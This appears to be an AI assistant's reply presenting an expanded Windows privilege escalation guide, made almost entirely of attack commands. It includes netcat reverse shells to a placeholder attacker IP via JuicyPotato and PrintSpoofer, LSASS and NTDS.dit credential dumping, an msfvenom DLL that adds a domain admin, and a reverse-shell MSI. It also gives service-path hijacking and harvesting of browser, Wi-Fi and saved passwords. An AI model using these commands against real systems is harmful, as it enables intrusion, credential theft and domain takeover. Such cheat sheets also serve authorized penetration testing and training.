Of course. I've updated the guide to include additional exploitation techniques like **AlwaysInstallElevated** and methods for finding insecure file/folder permissions. I've also integrated your section on searching for sensitive files.

# Windows Privilege Escalation Guide

This guide outlines common techniques and commands for escalating privileges on a Windows system. It starts with basic enumeration and moves through exploiting specific privileges, system vulnerabilities, and credential theft.

-----

## Initial Enumeration

The first step is always to gather as much information as possible about the system, users, and running processes.

### System & Network Information

Understand the machine's configuration, patch level, and network state.

```shell
# General system information
systeminfo

# Network configuration
ipconfig /all
arp -a
route print

# Firewall and AV status
Get-MpComputerStatus

# Installed hotfixes and patches
wmic qfe
Get-HotFix | ft -AutoSize

# Installed applications
wmic product get name
Get-WmiObject -Class Win32_Product | select Name, Version

# Active network connections
netstat -ano
```

### User & Group Enumeration

Identify the current user, their privileges, and other users/groups on the system.

```shell
# Current user and context
echo %USERNAME%
whoami
whoami /priv
whoami /groups
whoami /user

# List local users and groups
net user
net localgroup
net localgroup administrators

# Domain account policies
net accounts
```

### Processes, Services, and Tasks

Examine running processes and scheduled tasks for potential vulnerabilities.

```shell
# List running processes and associated services
tasklist /svc

# List all scheduled tasks with verbose output
schtasks /query /fo LIST /v

# List pipes to check for inter-process communication
pipelist.exe /accepteula
gci \\.\pipe\
```

-----

## Exploiting Privileges & Group Memberships

Leverage specific user rights or group memberships to gain higher privileges.

### User Privileges (`whoami /priv`)

Check your token privileges. Certain privileges are highly exploitable.

#### **SeImpersonate** / **SeAssignPrimaryToken** (Potato Attacks)

These privileges allow a service account to impersonate other users, including `NT AUTHORITY\SYSTEM`.

```shell
# Example with JuicyPotato
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe" -t *

# Example with PrintSpoofer
PrintSpoofer.exe -c "c:\tools\nc.exe <ATTACKER_IP> <PORT> -e cmd"
```

#### **SeDebugPrivilege**

Allows you to debug processes, including `lsass.exe`, to dump credentials.

```shell
# Dump the LSASS process memory
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Use Mimikatz to extract credentials from the dump file
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
exit
```

#### **SeTakeOwnershipPrivilege**

Allows you to take ownership of files or folders, even if you don't have explicit permissions.

```shell
# Take ownership of the file
takeown /f 'C:\Path\To\Sensitive\cred.txt'

# Grant yourself Full Control permissions
icacls 'C:\Path\To\Sensitive\cred.txt' /grant <your_username>:F

# Access the file
cat 'C:\Path\To\Sensitive\cred.txt'
```

#### **SeBackupPrivilege** / **SeRestorePrivilege**

Allows you to read/write any file on the system, bypassing standard ACLs. This is often used to grab the `NTDS.dit` file from a Domain Controller.

```shell
# Copy NTDS.dit and SYSTEM hive using robocopy with backup mode
robocopy /B C:\Windows\NTDS C:\temp ntds.dit
robocopy /B C:\Windows\System32\config C:\temp SYSTEM

# Dump hashes locally from the saved files
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

#### **SeLoadDriverPrivilege** (Print Operators)

Allows loading of kernel drivers. Abused by loading a vulnerable, signed driver to get arbitrary code execution in the kernel.

```shell
# Load a vulnerable driver (e.g., Capcom.sys)
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

# Exploit the driver to get a SYSTEM shell
.\ExploitCapcom.exe
```

### Group Memberships

Certain local or domain groups grant powerful permissions.

#### **Backup Operators**

Members of this group are granted **SeBackupPrivilege** and **SeRestorePrivilege** by default.

```shell
# Use robocopy's backup mode (/B) to copy sensitive files, ignoring ACLs
robocopy /B C:\Windows\NTDS C:\temp\ ntds.dit
robocopy /B C:\Windows\System32\config C:\temp\ SYSTEM

# Once exfiltrated, use secretsdump to extract the hashes
impacket-secretsdump -ntds C:\temp\ntds.dit -system C:\temp\SYSTEM LOCAL
```

#### **DnsAdmins**

Members of this group can load an arbitrary DLL into the DNS service, which runs as `SYSTEM`.

```shell
# Create a malicious DLL
msfvenom -p windows/x64/exec cmd='net group "domain admins" <user_to_add> /add /domain' -f dll -o adduser.dll

# Configure the DNS server to load the DLL and restart the service
dnscmd.exe /config /serverlevelplugindll C:\Path\To\adduser.dll
sc stop dns && sc start dns
```

#### **Server Operators**

Members can start and stop services. If a service is configured with a weak binary path or permissions, it can be abused.

```shell
# Reconfigure the service's binary path to execute your command
sc config <ServiceName> binPath= "cmd /c net localgroup Administrators <your_user> /add"

# Start the service to execute the payload
sc start <ServiceName>
```

-----

## Attacking the OS & Services

Exploit vulnerabilities in the operating system, kernel, or installed services.

### Kernel Exploits

Outdated systems may be vulnerable to known kernel exploits. Always check the patch level first.

```shell
# Use an automated checker like Sherlock or WinPEAS to find missing patches
Import-Module .\Sherlock.ps1
Find-AllVulns

# Example: HiveNightmare (CVE-2021-36934) - Allows reading SAM file
.\HiveNightmare.exe
impacket-secretsdump -sam SAM-backup -system SYSTEM-backup LOCAL
```

### Service & Application Misconfigurations

#### Unquoted Service Path

If a service path is unquoted and contains spaces, you can place a malicious executable in a higher-level directory to be executed instead.

```shell
# Find services with unquoted paths that are not in C:\Windows
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

#### Insecure File/Folder Permissions

Look for files or folders with weak permissions, especially executables run by services or scheduled tasks. If a file is writable by your user but executed by `SYSTEM`, you can replace it with a payload.

```shell
# Check permissions on a directory or file
icacls "C:\Program Files\SomeApp"
accesschk.exe /accepteula -d "C:\Program Files\SomeApp"

# Find all weak folder permissions in Program Files for Authenticated Users
accesschk.exe /accepteula -d -w "C:\Program Files" "Authenticated Users"

# After finding a writable executable run by SYSTEM, replace it with your payload
# Example: copy /Y C:\temp\payload.exe "C:\Program Files\SomeApp\vulnerable.exe"
# Then restart the service or wait for the task to run
```

#### **AlwaysInstallElevated** (MSI Exploit)

This is a policy setting that, when enabled, allows any user to install `.msi` packages with `SYSTEM` privileges. Both registry keys must be set to `1`.

```shell
# Check if the policy is enabled in both locations
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are present and set to 0x1, generate a malicious MSI file
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi -o malicious.msi

# Execute the MSI package on the target machine with no UI
msiexec /i malicious.msi /quiet /qn /norestart
```

### User Account Control (UAC) Bypass

Bypassing UAC achieves a high-integrity shell without a prompt. This is useful when you have admin credentials but are in a medium-integrity process.

```shell
# Check if UAC is enabled and its level
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

# Many bypasses involve DLL hijacking or abusing auto-elevated executables
# For a comprehensive list of methods, refer to the UACME project on GitHub.
```

-----

## Credential Theft & Hunting

Search for stored credentials in files, memory, and applications.

### Searching for Credentials in Configuration Files

Look for passwords, API keys, and connection strings in common configuration files and user documents.

```shell
# Search all common config/text files for the word "password"
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

# Check PowerShell history
cat (Get-PSReadLineOption).HistorySavePath

# Check for saved PSCredential objects
$credential = Import-Clixml -Path 'C:\Path\To\pass.xml'
$credential.GetNetworkCredential().password
```

### Searching the File System for Sensitive Information

Perform broad searches across the file system for files containing keywords or specific names.

```shell
# Recursively search files for specific keywords like passwords or usernames
Get-ChildItem -Path C:\ -Recurse -Force -Include *.config,*.ini,*.xml,*.bak,*.txt -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch 'Windows' } | Select-String -Pattern "password=","pwd=","user="

# Search for specific interesting filenames
Get-PSDrive -PSProvider FileSystem | ForEach-Object { Get-ChildItem -Path $_.Root -Recurse -Filter "unattended.xml" -ErrorAction SilentlyContinue }
```

### Dumping Credentials from Memory and Storage

Extract passwords and hashes from memory, browsers, and password managers.

```shell
# List credentials saved by Windows Credential Manager
cmdkey /list

# Use LaZagne to dump passwords from many applications
.\lazagne.exe all

# Dump browser credentials
.\SharpChrome.exe logins /unprotect

# Dump Wi-Fi passwords
netsh wlan show profile "<ProfileName>" key=clear
```

### Pillaging User Data

Beyond credentials, look for sensitive data in application files.

```shell
# Check mRemoteNG connection files for stored credentials
# Decrypt them using a known script
python3 mremoteng_decrypt.py -s "<EncryptedString>" -p <MasterPassword>

# Extract cookies from browser databases
Invoke-SharpChromium -Command "cookies <domain.com>"
```
